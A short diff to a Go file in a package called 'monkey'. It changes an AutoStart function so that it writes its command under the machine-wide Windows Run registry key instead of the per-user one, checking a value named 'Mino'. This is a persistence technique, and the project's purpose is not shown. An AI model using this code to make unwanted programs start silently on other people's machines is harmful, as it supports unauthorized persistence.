@@ -5,14 +5,13 @@ package monkey
 import (
 	"golang.org/x/sys/windows/registry"
 	"log"
-	"os"
 )
 
 func AutoStart(cmd string) {
-	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
 	if err != nil {
 		log.Println(err)
-		os.Exit(0)
+		return
 	}
 	raw, _, _ := k.GetStringValue("Mino")
 	if raw == cmd {
